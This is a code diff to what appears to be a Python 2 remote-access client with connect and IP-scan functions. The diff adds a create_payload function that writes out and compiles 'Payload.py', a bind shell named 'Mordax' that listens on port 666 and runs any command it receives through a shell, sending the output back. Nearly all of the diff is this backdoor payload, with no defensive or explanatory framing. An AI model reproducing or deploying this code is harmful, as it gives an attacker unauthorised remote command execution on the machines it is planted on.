@@ -1,7 +1,17 @@
-
+import os
 import socket
 import threading
-
+import time
+import Compiler
+def create_payload():
+    code = ['import socket\n', 'import subprocess\n', 'import os\n', 'import sys\n', 'host = ""\n', 'port = 666\n', 'import threading\n', '\n', 'class Mordax():\n', '    def __init__(self):\n', '        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n', '        self.s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n', '        self.s.bind((host, port))\n', '        self.s.listen(3)\n', '\n', '    def start(self):\n', '        self.connection, self.addr = self.s.accept()\n', '        if self.connection and self.addr:\n', '            connect = threading.Thread(target=self.server)\n', '            connect.start()\n', '            self.start()\n', '\n', '    def server(self):\n', '\n', '        print(self.addr[0])\n', '\n', '        while True:\n', '\n', '            try:\n', '                data = self.connection.recv(2048)\n', '                if data[:2] == "cd":\n', '                    path = data[3:]\n', '                    try:\n', '                        os.chdir(data[3:])\n', '                    except Exception:\n', '                        mmm = 1\n', '\n', '                if data[3:] == "dir":\n', '                    os.listdir(path)\n', '\n', '                if len(data) > 0:\n', '                    if data == "close":\n', '                        print("close")\n', '                        self.s.close()\n', '                        self.connection.close()\n', '                        self.server()\n', '                    cmd = subprocess.Popen(data, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n', '                    stdout = cmd.stdout.read() + cmd.stderr.read() + ";" + os.getcwd()\n', '                    size = sys.getsizeof(stdout)\n', '                    if size > 2048:\n', '                        size = sys.getsizeof(stdout)\n', '                        size = str(size)\n', '                        self.connection.send("SIZE" + "; " + size)\n', '                        self.connection.send(stdout)\n', '                    else:\n', '                        self.connection.send(stdout)\n', '            except socket.error as error:\n', '                self.connection.close()\n', '                self.connection, addr = self.s.accept()\n', '                print(addr)\n', '\n', '\n', '\n', 'Server = Mordax()\n', 'Server.start()']
+    with open ("Payload.py", "w+") as file:
+        for x in code:
+            file.write(x)
+        try:
+            Compiler.start("Payload.py")
+        except Exception as E:
+            print(E)
 
 
 def connect(host):
@@ -50,10 +60,6 @@ def connect(host):
         else:
             print data[0]
             text = data[1] + ">"
-
-
-
-
 
 def scan(args):
    start = raw_input("Start IP: ")
